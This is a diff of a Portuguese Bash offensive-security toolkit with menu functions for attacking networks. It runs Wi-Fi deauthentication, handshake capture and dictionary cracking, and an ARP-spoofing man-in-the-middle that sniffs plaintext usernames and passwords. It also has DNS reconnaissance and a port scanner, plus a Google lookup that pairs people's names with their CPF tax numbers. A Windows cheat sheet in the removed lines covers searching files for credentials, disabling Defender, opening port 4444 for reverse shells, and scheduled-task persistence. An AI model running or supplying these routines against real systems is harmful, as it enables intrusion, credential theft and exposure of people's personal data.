-    # Definição da função principal main_tec_esc_rbash
-    function main_tec_esc_rbash(){
-        # Chamar função para verificar comandos instalados e escapar do rbash
-        verifica_comandos_instalados;
-        pausa_script;
-    }
-
-    # Chamar função principal
-    main_tec_esc_rbash
-
-}
-# Este script realiza testes de penetração em redes wireless
-function xviii_wifi_atk(){
-    ##############################################################
-    #
-    #           Wireless Pentest 
-    #
-    #           AUTOR: Z1GSN1FF3R||R3v4N||0wL 
-    #
-    #           DATA: 01-27-2021
-    #           REFATORADO: 04-22-2024    
-    #   
-    #           DESCRIÇÃO: Este script realiza testes de penetração em redes wireless.
-    #
-    #
-    ##############################################################
-     
-    # Função para executar configurações preliminares antes do ataque
-    function pre_configuracoes(){
-        # **Descrição:** Desliga a interface 'mon0' do modo monitor.
-
-        airmon-ng stop mon0
-
-        # **Explicação:**
-
-        # O comando `airmon-ng stop mon0` desativa a interface 'mon0' do modo monitor. 
-        # Isso é necessário para que a interface possa ser usada para outras finalidades, como se conectar a uma rede Wi-Fi.
-        # É importante notar que este comando pode falhar se a interface 'mon0' não estiver ativa no modo monitor.
-
-        # **Observações:**
-
-        # Certifique-se de que a interface 'mon0' esteja ativa no modo monitor antes de executar este comando.
-        # Se o comando falhar, tente verificar o status da interface com o comando `airmon-ng check`.
-    }
-
-    # Função para mostrar as interfaces wireless disponíveis e configurar a interface para o modo monitor
-    function interfaces_disponiveis(){
-        clear
-        #if #TODO: ADC UMA CHECAGEM IF AQUI PARA VERIFICAR A INTERFACE WIFI
-        #echo ""
-        #echo "=========== IW DISPONIVEIS ============="
-        #airmon-ng
-        #echo "=========== MONITOR MODE ============="
-        #read -p "Interface Wireless para entrar em modo monitor: " INTERFACE
-        #echo "======================================"
-        #echo ""
-    }        
-
-    # Função para realizar as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
-    function configuracoes_iniciais(){
-        # Desativa a interface de rede
-        ifconfig "${INTERFACE}" down
-
-        # Adiciona uma nova interface em modo monitor chamada mon0
-        iw dev "${INTERFACE}" interface add mon0 type monitor
-
-        # Altera o endereço MAC da interface mon0
-        macchanger -r mon0
-
-        # Verifica se há processos em execução que podem interferir e os encerra
-        airmon-ng check kill #kill the process that maybe cause some problem
-
-        # Solicita ao usuário para pressionar ENTER para continuar
-        echo -e "${GRAY} Pressione ENTER para continuar${RESET}" && read -r 2> /dev/null
-    }
-
-    # Função para iniciar o monitoramento em modo promíscuo
-    function monitoramento_promiscuo(){
-        # Obtém o timestamp atual para nomear o arquivo de log
-        local timestamp
-        timestamp=$(date +"%d%H%M%b%y")    
-
-        # Executa o comando airodump-ng para iniciar o monitoramento em modo promíscuo e escrever os resultados em um arquivo de log com o timestamp no nome
-        airodump-ng mon0 --write monitoramento_promiscuo_log"$timestamp"
-    }
-
-    # Função para escanear o Access Point (AP) alvo e escrever os resultados em um arquivo de log
-    function scan_ap_alvo(){    
-        echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
-        echo "============================================"
-
-        # Solicita ao usuário o BSSID (MAC do AP) do alvo
-        read -r -p "BSSID (MAC do AP) do alvo: " MACTARGET
-
-        # Solicita ao usuário o canal do AP
-        read -r -p "Canal do AP: " CHANNEL #TODO: ADC TRATAMENTO PARA FILTRAR O CANAL DO AP LOGO APÓS A INSERÇÃO DO BSSID
-
-        echo "============================================"
-        echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
-
-        # Executa o comando airodump-ng para escanear o AP alvo, utilizando o BSSID e o canal fornecidos pelo usuário, e escreve os resultados em um arquivo de log
-        airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_alvo_log
-    }
-
-    # Função para capturar o handshake de autenticação entre o cliente e o AP alvo
-    function captura_4whsk(){
-        # Abre uma nova sessão do Tilix e executa o comando airodump-ng para capturar o handshake de autenticação entre o cliente e o AP alvo.
-        # Os resultados são escritos em um arquivo de log chamado captura_4whsk_log.
-        # O redirecionamento "> /dev/null 2>&1" é utilizado para suprimir a saída padrão e de erro do comando, e o processo é executado em segundo plano "&".
-        tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write captura_4whsk_log > /dev/null 2>&1 &
-    }
-
-    # Função para realizar um ataque de desautenticação (deauth) no cliente especificado
-    function ataque_deauth(){  
-        echo ""
-        echo "============================================"
-        read -r -p "MAC do cliente para ser desconectado: " CLNTMAC
-        echo "============================================"
-        echo ""
-        # Deauth no cliente
-        for ((i=1;i<=3;i++)); do
-            # Executa o comando aireplay-ng para realizar o ataque de desautenticação.
-            # A opção "--deauth=5" indica o número de pacotes de desautenticação a serem enviados.
-            # Os parâmetros "-a" e "-c" especificam o endereço MAC do AP alvo e do cliente, respectivamente.
-            # A saída do comando é salva em um arquivo de log chamado ataque_deauth.log, utilizando o comando "tee -a".
-            aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLNTMAC" mon0 | tee -a ataque_deauth.log
-            # Mensagem para informar o intervalo entre os ataques de desautenticação
-            echo "Intervalo de 5s entre um ataque e outro de Deauth. Aperte Ctrl+C para cancelar após a captura do 4-way-handshake"
-            if [ $i -lt 3 ]; then #TODO:VERIFICAR NECESSIDADE DESSE IF
-                sleep 5
-            fi
+        # Iterar sobre os servidores de nomes e listar os registros de zona de autoridade
+        for SERVER in $NS_SERVERS; do
+            host -l -a "$TARGET" "$SERVER"
         done
-    }
-
-    # Função para quebrar a senha usando um dicionário de palavras
-    function quebra_senha_dicionario(){
-        aircrack-ng captura_4whsk_log*.cap -w /usr/share/wordlists/rockyou.txt
-    }
-
-    # Função principal para executar todas as etapas do ataque
-    function main_wifi_atk(){
-        # Executa as configurações pré-ataque
-        pre_configuracoes;
-        # Verifica as interfaces disponíveis
-        interfaces_disponiveis;
-        # Realiza as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
-        configuracoes_iniciais;
-        # Inicia o monitoramento em modo promíscuo
-        monitoramento_promiscuo;
-        # Escaneia o AP alvo e grava os resultados em um arquivo de log
-        scan_ap_alvo;
-        # Captura o handshake de autenticação entre o cliente e o AP alvo
-        captura_4whsk;
-        # Realiza um ataque de desautenticação no cliente especificado
-        ataque_deauth;
-        # Tenta quebrar a senha utilizando um dicionário
-        quebra_senha_dicionario;
-        # Mensagem para pressionar ENTER para continuar
+        
+        # Aguarda o usuário pressionar Enter para continuar
         echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
         read -r 2> /dev/null
-        # Chamada da função principal do menu principal após pressionar ENTER
-        main_menu;  
+        
+        main_menu; # Retorna ao menu principal
     }
+    # Define a função vi_Subdomain_takeover para realizar um ataque de Subdomain Takeover
+    function vi_Subdomain_takeover(){
+        # Solicita ao usuário o host para o ataque
+        echo "Digite o host para o ataque de Subdomain takeover"
+        read -r HOST
+        
+        # Solicita ao usuário o arquivo contendo os domínios a serem testados
+        echo "Aponte para o arquivo com os domínios a serem testados."
+        read -r FILE
+        
+        # Define o comando a ser usado para verificar os CNAME dos subdomínios
+        COMMAND="host -t cname"
+        
+        # Itera sobre cada palavra no arquivo de domínios e executa o comando de verificação
+        for WORD in $($FILE); do
+            $COMMAND "$WORD"."$HOST" | grep "alias for"
+        done
+        
+        # Aguarda o usuário pressionar Enter para continuar
+        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+        read -r 2> /dev/null
+        
+        main_menu; # Retorna ao menu principal
+    }
+    # Define a função vii_rev_dns para realizar uma pesquisa de DNS reverso
+    function vii_rev_dns(){
+        echo "Dns Reverse"
+        
+        # Solicita ao usuário o endereço para a pesquisa de DNS reverso
+        echo "Insira o endereço para o DNS REVERSE"
+        read -r ADDRESS
+        
+        # Solicita ao usuário o início do intervalo de endereços IP
+        echo "Digite o início do intervalo de endereços IP"
+        read -r START
+        
+        # Solicita ao usuário o fim do intervalo de endereços IP
+        echo "Digite o fim do intervalo de endereços IP"
+        read -r END
+        
+        # Define o nome do arquivo de saída
+        OUTPUT="$ADDRESS.$START-$END.txt"
+        
+        # Remove o arquivo de saída se existir e cria um novo
+        rm -rf "$OUTPUT"
+        touch "$OUTPUT"
+        
+        # Itera sobre os endereços IP no intervalo especificado e realiza a pesquisa de DNS reverso
+        for RANGE in $(seq "$START" "$END"); do
+            # Usa o comando host para obter o registro PTR e extrai o nome do host
+            host -t ptr "$ADDRESS"."$RANGE" | cut -d ' ' -f5 | grep -v '.ip-' >> "$OUTPUT"
+        done
+        
+        # Exibe o conteúdo do arquivo de saída
+        cat "$OUTPUT"
+        
+        # Aguarda o usuário pressionar Enter para continuar
+        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+        read -r 2> /dev/null
+        
+        main_menu; # Retorna ao menu principal
+    }
+    # Define a função viii_recon_dns para realizar uma reconhecimento de DNS
+    function viii_recon_dns(){
+        # Conta o total de linhas no arquivo de lista de subdomínios
+        TOTAL_LINHAS=$(wc -l /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt|awk '{print $1}')
+        
+        echo "DNS recon"
+        
+        # Solicita ao usuário o endereço para o DNS RECON
+        echo "Insira o endereço para o DNS RECON (EX: businesscorp.com.br)"
+        read -r DOMAIN
+        
+        # Inicializa a contagem de linha
+        linha=0
+        
+        # Itera sobre cada subdomínio na lista de subdomínios
+        # shellcheck disable=SC2013
+        for SUBDOMAIN in $(cat /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt); do
+            # shellcheck disable=SC2219
+            let linha++ # Incrementa o contador de linha
+            
+            # Realiza uma pesquisa de DNS para o subdomínio atual e salva no arquivo dns_recon_$DOMAIN.txt
+            host "$SUBDOMAIN"."$DOMAIN" >> dns_recon_"$DOMAIN".txt
+            
+            # Exibe o progresso da pesquisa
+            echo "--------PESQUISANDO---------> $linha/$TOTAL_LINHAS"
+        done 
+        
+        # Aguarda o usuário pressionar Enter para continuar
+        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+        read -r 2> /dev/null
+        
+        main_menu; # Retorna ao menu principal
+    }
+    # Define a função ix_consulta_geral_google para realizar uma consulta geral no Google
+    function ix_consulta_geral_google(){
+        echo "Consulta Geral Google" # Exibe mensagem indicando o início da consulta
+        
+        # Define as variáveis
+        #FIREFOX_SEARCH="firefox &"
+        LYNX_SEARCH="lynx -dump -hiddenlinks=merge -force_html"
+        LISTA=./amanda2csv.csv
+        
+        # Define a função para aguardar a entrada do usuário
+        function waitingUser() {
+            read -r "Pressione Enter para continuar..."
+        }
+        
+        # Define a função para realizar a consulta geral no Google
+        function consulta_geral_google (){
+            # Itera sobre cada linha no arquivo de lista de consultas
+            while IFS= read -r LINHA; do
+                local NOME
+                NOME="$(echo "$LINHA" |awk -F, '{print $1}')" # Extrai o nome da linha
+                local CPF
+                CPF="$(echo "$LINHA" |awk -F, '{print $2}')"   # Extrai o CPF da linha
+                
+                # Exibe a mensagem indicando a pesquisa atual
+                echo "==="
+                echo "Pesquisando:""$NOME"+"$CPF"
+                
+                # Realiza a pesquisa no Google usando lynx e filtra os resultados
+                $LYNX_SEARCH "https://www.google.com/search?q=intext:$NOME+intext:$CPF" | grep -i '\.pdf' | cut -d '=' -f2 | grep -v 'x-raw-image' | sed 's/...$//' | grep -E -i "(HTTPS|HTTP)"
+                
+                waitingUser # Aguarda o usuário pressionar Enter para continuar com a próxima pesquisa
+            done < "$LISTA" # Redireciona o arquivo de lista de consultas para a entrada do loop
+            echo "============ fim da consulta ===========" # Indica o fim da consulta
+        }
+        
+        # Chama a função para realizar a consulta geral no Google
+        consulta_geral_google
+        
+        # Aguarda o usuário pressionar Enter para continuar
+        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+        read -r 2> /dev/null
+        
+        main_menu; # Retorna ao menu principal
+    }
+    # Define a função x_mitm para realizar um ataque de Man-in-the-Middle (MiTM)
+    function x_mitm(){
+        ########### VARIAVEIS ##############
+        # Obtém o nome da interface de rede que começa com 'tap'.
+        INTERFACE=$(ip -br a | grep tap | head -n 1 | cut -d ' ' -f1)
+        # Calcula a rede da interface obtida anteriormente.
+        REDE=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}'|awk -F '/' '{print $1}')"|grep -F "Network:"|awk '{print $2}')
+        
+        ########### FUNÇÕES ##############
+        # Limpa a tela e exibe informações sobre a interface e a rede de ataque.
+        function mensagem_inicial (){
+            clear
+            echo "============= 0.0wL ============="
+            echo "INTERFACE DO ATAQUE: $INTERFACE"
+            echo "REDE DO ATAQUE: $REDE"
+            echo "================================="
+        }
+        
+        # Habilita o roteamento de pacotes no sistema.
+        function habilitar_roteamento_pc (){
+            echo 1 > /proc/sys/net/ipv4/ip_forward
+            echo "================================="
+            echo "ROTEAMENTO DE PACOTES HABILITADO"
+            echo "================================="
+        }
+        
+        # Configura o ambiente para spoofing e captura de pacotes.
+        function estrutura_mitm (){
+            macchanger -r "$INTERFACE";  # Altera o endereço MAC da interface para fins de spoofing
+            #wireshark -i "$INTERFACE" -k >/dev/null 2>&1 & # Inicia o Wireshark para captura de pacotes em segundo plano #TODO:REATIVAR WIRESHARK 
+            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
+            sleep 10  # Espera por 10 segundos
+            echo -n "Digite o IP do ALV01: "  # Solicita o IP do alvo 1
+            read -r ALV01  # Lê o IP do alvo 1
+            echo -n "Digite o IP do ALV02: "  # Solicita o IP do alvo 2
+            read -r ALV02  # Lê o IP do alvo 2
+            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
+            #clear  # Limpa a tela
+            #open a new konsole session with arpspoof
+            tcpdump -i "$INTERFACE" -t host "$ALV01" and host "$ALV02" | grep -E '\[P.\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt #todo: add mais ext aos filtros com regex '  # Inicia o Tcpdump para captura de pacotes entre os alvos
+        }
+        
+        # Função principal para execução do ataque MiTM
+        function main_mitm (){
+            mensagem_inicial;  # Chama a função mensagem_inicial.'
+            habilitar_roteamento_pc;  # Chama a função habilitar_roteamento_pc.'
+            estrutura_mitm;  # Chama a função estrutura_mitm.'
+            echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+            read -r 2> /dev/null
+            main_menu
+        }
+        
+        ########### MAIN ##############
+        main_mitm;
 
-    # Chama a função principal
-    main_wifi_atk;
+    }
+    # Portscan usando bashsocket
+    function xi_portscan_bashsocket(){
+        # Script retirado do livro Cybersecurity Ops with bash e modificado para as minhas necessidades
+        #
+        # Descrição:
+        # Executa um portscan em um determinado host
+        #
 
-}
-#
-function xix_cmd_basicos_windows(){
+        echo -n "Insira o alvo para o portscan (ex: 192.168.9.5): "
+        read -r host_alvo
+        printf 'Alvo -> %s - Porta(s): ' "$host_alvo"  # Imprime o prefixo antes do loop
+
+        # Usar uma variável para armazenar as portas encontradas
+        portas_encontradas=""
+
+        # Loop para verificar portas abertas
+        for ((porta=1; porta<1024; porta++)); do
+            cat >/dev/null 2>&1 < /dev/tcp/"${host_alvo}"/"${porta}"
+            # shellcheck disable=SC2181
+            if (($? == 0)); then 
+                portas_encontradas+=" $porta"  # Adiciona a porta à lista de portas encontradas
+            fi
+        done 
+
+        # Imprime a lista de portas encontradas
+        echo "Portas abertas em $host_alvo: $portas_encontradas"
+        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+        read -r 2> /dev/null
+        main_menu;
+    }
+    # Define a função xii_comandos_uteis_linux para explicar sobre comandos úteis no linux
+    function xii_comandos_uteis_linux(){
+    # limpa a tela
     clear
-    echo -e ""
-    function comandos_basicos() {
-        echo -e "${WHITE}############################## COMANDOS BÁSICOS ##############################${RESET}"
-        echo -e "${RED}help ${GRAY}# Mostra os comandos disponíveis.${RESET}"
-        echo -e "${RED}help <comando> OR <comando> /? ${GRAY}# Mostra a ajuda para utilizar determinado comando.${RESET}"
-        echo -e ""
-        echo -e "${RED}cls ${GRAY}# Serve para limpar a tela do terminal em uso${RESET}"
-    }
-    function dir_cmd(){
-        echo -e "${WHITE}################### DIR #######################${RESET}"
-        echo -e "${RED}dir ${GRAY}# Serve para listar os arquivos presentes no diretório atual.${RESET}"
-        echo -e "${RED}dir /a ${GRAY}# Lista inclusive arquivos ocultos${RESET}"
-        echo -e ""
-    }
-    function gamb_dir2find(){
-        echo -e "${WHITE}############### GAMBIARRA SEMELHANTE AO FIND #################${RESET}"
-        echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config* ${GRAY}# Busca por arquivos que contenham o nome especificado, a partir do diretório atual. (observação: '==' é equivalente a 'or')${RESET}"
-        echo -e ""
-    }
-    function cd_cmd(){
-        echo -e "${WHITE}################### CD #######################${RESET}"
-        echo -e "${RED}cd <diretorio> ${GRAY}# Serve para navegar entre os diretórios do Windows.${RESET}"
-        echo -e "${RED}cd .. ${GRAY}# Navegar para um diretório acima do diretório atual${RESET}"
-        echo -e "${RED}cd ${GRAY}# Mostra qual o diretório atual (semelhante ao \"pwd\" do linux)${RESET}"
-        echo -e ""
-        echo -e "${RED}md ${GRAY}# Serve para criar um novo diretório.${RESET}"
-        echo -e ""
-    }
-    function rd_cmd(){
-        echo -e "${WHITE}################### RD #######################${RESET}"
-        echo -e "${RED}rd ${GRAY}# Serve para deletar um diretório.${RESET}"
-        echo -e "${RED}rd /s ${GRAY}# modo recursivo${RESET}"
-        echo -e "${RED}rd /q ${GRAY}# (quiet, sem pedir confirmação)${RESET}"
-        echo -e ""
-        echo -e "${RED}type ${GRAY}# Exibe o conteúdo, em formato de texto, de um arquivo.${RESET}"
-        echo -e ""
-        echo -e "${RED}ren <nome_antigo> <nome_novo> ${GRAY}# Renomear determinado arquivo ou diretório.${RESET}"
-        echo -e ""
-    }
-    function xcopy_cmd(){
-        echo -e "${WHITE}################### XCOPY #######################${RESET}"
-        echo -e "${RED}xcopy <arquivo_original> <nome_da_copia> ${GRAY}# Faz a cópia de arquivos/diretórios. Porém não copia os subdiretórios.${RESET}"
-        echo -e ""
-        echo -e "${RED}xcopy /e <original> <copia> ${GRAY}# Copia inclusive subdiretórios.${RESET}"
-        echo -e "${RED}xcopy /s <original> <copia> ${GRAY}# Copia inclusive subdiretórios, exceto os subdiretórios vazios.${RESET}"
-        echo -e ""
-        echo -e ""
-        echo -e "${RED}del ${GRAY}# Deleta um arquivo e/ou diretório${RESET}"
-        echo -e ""
-        echo -e ""
-        echo -e "${RED}move <origem> <destino> ${GRAY}# Move um arquivo/diretório de um local para outro.${RESET}"
-        echo -e ""
-    }
-    function whoami_cmd(){
-        echo -e "${WHITE}################### WHOAMI #######################${RESET}"
-        echo -e "${RED}whoami ${GRAY}# Mostra o nome de usuário e domínio atual.${RESET}"
-        echo -e "${RED}whoami /priv ${GRAY}# Mostra os privilégio do usuário.${RESET}"
-        echo -e ""
-    }
-    function tree_cmd(){
-        echo -e "${WHITE}################### TREE #######################${RESET}"
-        echo -e "${RED}tree ${GRAY}# Lista o diretório atual e todos os seus subdiretórios.${RESET}"
-        echo -e "${RED}tree <diretorio> ${GRAY}# Lista o diretório informado e todos os seus subdiretórios${RESET}"
-        echo -e "${RED}tree /f ${GRAY}# Lista o diretório atual, assim como todos os seus subdiretórios e arquivos.${RESET}"
-        echo -e ""
-    }
-    function shutdown_cmd(){
-        echo -e "${WHITE}################### SHUTDOWN #######################${RESET}"
-        echo -e "${RED}shutdown ${GRAY}# Desligar/ reiniciar o sistema.${RESET}"
-        echo -e "${RED}shutdown /s ${GRAY}# Desligar${RESET}"
-        echo -e "${RED}shutdown /l ${GRAY}# fazer logoff${RESET}"
-        echo -e "${RED}shutdown /r ${GRAY}# reiniciar${RESET}"
-        echo -e "${RED}shutdown /f ${GRAY}# executar shutdown sem avisar o usuário (Força fechamento dos programas em execução)${RESET}"
-        echo -e "${RED}shutdown /c \"comentario\" ${GRAY}# aparece um aviso para o usuário antes de fazer o desligamento.${RESET}"
-        echo -e ""
-    }
-    function outros(){
-        echo -e "${WHITE}################### OUTROS #######################${RESET}"
-        echo -e "${RED}> ${GRAY}# Direciona a saída de um comando para um arquivo (substituindo o conteúdo do arquivo).${RESET}"
-        echo -e "${RED}>> ${GRAY}# Direciona a saída de um comando para o conteúdo de um arquivo (Adiciona o conteúdo do arquivo).${RESET}"
-        echo -e ""
-        echo -e "${RED}sort arquivo.txt ${GRAY}# Exibe o conteúdo do arquivo especificado, na ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
-        echo -e "${RED}sort /r arquivo.tx ${GRAY}# Exibe o conteúdo do arquivo especificado, de maneira inversa à ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
-        echo -e ""
-        echo -e "${RED}type arquivo.txt | sort ${GRAY}# O comando sort é executado em cima do resultado do comando type.${RESET}"
-        echo -e ""
-        echo -e "${RED}2>nul ${GRAY}# Omite a saída de erros de um comando.${RESET}"
-        echo -e ""
-    }
-    function findstr_cmd(){
-        echo -e "${WHITE}################### FINDSTR #######################${RESET}"
-        echo -e "${RED}findstr \"string\" <arquivo.txt> ${GRAY}# Exibe apenas as linhas do arquivo.txt que possuam a string especificada.${RESET}"
-        echo -e "${RED}findstr /spin /c:\"password\" *.* 2>nul ${GRAY}# Procura, em todos os arquivos a partir do diretório atual, por arquivos que contenham a string especificada.${RESET}"
-        echo -e ""
-    }
-    function attrib_cmd(){
-        echo -e "${WHITE}################### ATTRIB #######################${RESET}"
-        echo -e "${RED}attrib ${GRAY}# Exibe os atributos dos arquivos do diretório atual.${RESET}"
-        echo -e "${RED}attrib /d ${GRAY}# Exibe os atributos dos arquivos e diretórios do diretório atual. ${RESET}"
-        echo -e "${RED}attrib /s ${GRAY}# Exibe os atributos dos arquivos do diretório atual e dos arquivos nos subdiretórios.${RESET}"
-        echo -e ""
-        echo -e "${RED}attrib +S +H <arquivo> ${GRAY}# Deixa um arquivo oculto e não mostra esse arquivo, quando aberto pela interface gráfica, mesmo com a opção de "mostrar arquivos ocultos" estando ativa.${RESET}"
-        echo -e ""
-    }
-    function cmd4enum_cmd(){
-        echo -e "${WHITE}################### CMD 4 ENUM #######################${RESET}"
-        echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config*${RESET}"
-        echo -e "${RED}tree /f${RESET}"
-        echo -e "${RED}findstr /spin /c:\"password\" *.* 2>null${RESET}"
-        echo -e ""
-    }
-    function icalcs(){
-        echo -e "${WHITE}################### ICALCS #######################${RESET}"
-        echo -e "${RED}ICACLS: —> Lista e gerencia as DACL (informações de permissão) das pastas/arquivos.${RESET}"
-        echo -e ""
-        echo -e "${GRAY}Exemplo:${RESET}"
-        echo -e "${BLUE}> icacls \"arquivo 2.txt\"${RESET}"
-        echo -e "${GRAY}#arquivo 2.txt AUTORIDADE NT\SISTEMA:(I)(F) -- SYSTEM${RESET}"
-	    echo -e "${GRAY}#              BUILTIN\Administradores:(I)(F) -- USUARIOS ADMIN${RESET}"
-	    echo -e "${GRAY}#              DESKTOP-JPMQF3L\aluno:(I)(F) -- USUARIO aluno MAQUINA JPMQF3L${RESET}"
-        echo -e ""
-        echo -e "${RED}icacls arquivo /grant aluno:F ${GRAY}# Adicionar permissões${RESET}"
-        echo -e ""
-        echo -e "${RED}icacls arquivo /deny aluno:F ${GRAY}# Negar permissões${RESET}"
-        echo -e ""
-        echo -e "${RED}whoami /groups ${GRAY}# Verificar o nível de integridade${RESET}"
-    }
-    function system_info(){
-        echo -e ""
-        echo -e "${WHITE}################### INFORMAÇOES DO SISTEMA #######################${RESET}"
-        echo -e "${RED}hostname ${GRAY}# Exibe o nome do host${RESET}"
-        echo -e ""
-        echo -e "${RED}netstat -ano ${GRAY}# Mostra serviços com portas e conexões ativas.${RESET}"
-        echo -e ""
-        echo -e "${RED}ver ${GRAY}# Exibe a build do sistema${RESET}"
-        echo -e ""
-        echo -e "${RED}systeminfo ${GRAY}# Exibe informações do sistema${RESET}"
-        echo -e ""
-        echo -e "${RED}winver ${GRAY}# Exibe a versão, build e SO.${RESET}"
-        echo -e ""
-    }
-    function processos_gerenciamento(){
-        echo -e "${WHITE}################### GERENCIAMENTO DE PROCESSOS #######################${RESET}"
-        echo -e "${GRAY}Processo corresponde a uma instância de um programa, ou seja, um programa que está sendo executado no sistema operacional, consumindo recursos.${RESET}"
-        echo -e ""
-        echo -e "${RED}wmic product get name,version,installlocation ${GRAY}# Lista os programas instalados no sistema, assim como suas versões e locais onde estão instalado.${RESET}"
-        echo -e ""
-        echo -e "${RED}tasklist ${GRAY}# Lista os processos ativos, nomes, PID, etc...${RESET}"
-        echo -e "${RED}tasklist /M ${GRAY}# lista as DLL que cada processo usa${RESET}"
-        echo -e "${RED}tasklist /SVC ${GRAY}# lista os serviços relacionados com esse processo${RESET}"
-        echo -e "${RED}tasklist /V ${GRAY}# Mostra qual usuário está utilizando determinado processo${RESET}"
-        echo -e ""
-        echo -e "${RED}taskkill /pid xxxx /f ${GRAY}# Mata determinado processo ativo (Ex: taskkill /pid 3395).${RESET}"
-        echo -e ""
-    }
-    function usuarios_gerenciamento(){
-        echo -e "${WHITE}################### GERENCIAMENTO DE USUARIOS #######################${RESET}"
-        echo -e "${RED}net user ${GRAY}# Listar usuários da maquina${RESET}"
-        echo -e "${RED}net user <usuario> ${GRAY}# Ver detalhes do usuário (grupos, etc)${RESET}"
-        echo -e "${RED}net localgroup ${GRAY}# Lista grupos existentes na máquina${RESET}"
-        echo -e "${RED}net localgroup <nome_do_grupo> ${GRAY}# Ver quais usuários estão em determinado grupo${RESET}"
-        echo -e "${RED}net user <novo_usuario> <nova_senha> /add ${GRAY}# Criar novo usuário${RESET}"
-        echo -e "${RED}net user <usuario> /del ${GRAY}# Remover o usuário especificado ${RESET}"
-        echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /add ${GRAY}# Adicionar o usuário especificado no grupo especificado${RESET}"
-        echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /del ${GRAY}# Remover o usuário especificado no grupo especificado ${RESET}"
-        echo -e "${RED}net user <usuario> <nova_senha> ${GRAY}# Alterar senha de um usuário${RESET}"
-        echo -e "${RED}net user <usuario> /active:yes ${GRAY}# Habilitar ou desabilitar usuário (yes ou no)${RESET}"
-        echo -e ""
-    }
-    function firewall_gerenciamento(){
-        echo -e "${WHITE}################### GERENCIAMENTO DE FIREWALL #######################${RESET}"
-        echo -e "${RED}netsh advfirewall show currentprofile ${GRAY}# Mostra o status do firewall (apenas o perfil ativo)"
-        echo -e "${RED}netsh advfirewall set allprofiles state off ${GRAY}# Desabilita o firewall do Windows."
-        echo -e "${RED}netsh advfirewall set allprofiles state on ${GRAY}# Habilita o firewall do Windows."
-        echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp program=\"C:\caminho\programa.exe\" enable=yes ${GRAY}# Permitir que um programa especifico no echo -e firewall."
-        echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp localport=4444 enable=yes ${GRAY}# Abrir a porta especificada no firewallecho -e "
-        echo -e ""
-        echo -e "${GRAY}# dir = in | out"
-        echo -e "${GRAY}# action = allow|block"
-        echo -e "${GRAY}# protocol = TCP | UDP |any"
-        echo -e "${GRAY}# Obs: As portas 80 e 443 costumam estar abertas para conexões de saída. Interessante tentar utilizar essas portas para obter um shell reverso."
-        echo -e ""
-    }
-    function antivirus_gerenciamento(){
-        echo -e "${WHITE}################### GERENCIAMENTO DE ANTIVIRUS #######################${RESET}"
-        echo -e "${GRAY}Sequencia de comandos para tentar desabilitar o Windows defender, utilizando o powershell. Não é necessário reiniciar a máquina. Mudar para ${GREEN} \$false ${RESET}${GRAY} caso queira reativar:${RESET}"
-        echo -e ""
-        echo -e "${RED}powershell.exe Set-MpPreference -DisableRealTimeMonitoring \$true ${GRAY}# Desabilita o scan em tempo real${RESET}"
-        echo -e ""
-        echo -e "${GRAY}No Windows a partir da ${GREEN}build 18305, a proteção contra violações do Windows defender deve estar desativada.${RESET}${GRAY} Para verificar se a proteção contra violações está ativa, use o comando:"
-        echo -e ""
-        echo -e "${RED}powershell.exe Get-MpComputerStatus${RESET}"
-        echo -e ""
-        echo -e "${GRAY}Na saída do comando acima, ${RED}procurar por \"IsTamperProtected\". Caso esteja como true, não será possível desabilitar o Windows defender via terminal.${RESET}"
-        echo -e ""
-    }
-    function tarefas_agendadas_gerenciamento(){
-        echo -e "${WHITE}################### GERENCIAMENTO DE TAREFAS AGENDADAS #######################${RESET}"
-        echo -e ""
-        echo -e "${RED}schtasks /query /v /fo list ${GRAY}# Lista as tarefas agendadas disponíveis no sistema. Filtrar saída com findstr para buscar algo especifico.${RESET}"
-        echo -e "${RED}schtasks /query /v /fo list | findstr /L \".exe\" ${GRAY}# Exemplo${RESET}"
-        echo -e "${RED}schtasks /query /v /fo list | findstr /L \".bat\" ${GRAY}# Exemplo${RESET}"
-        echo -e ""
-        echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"dominio\usuário\" /RP \"senha_do_usuário\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário especificado, a cada minuto.${RESET}"
-        echo -e ""
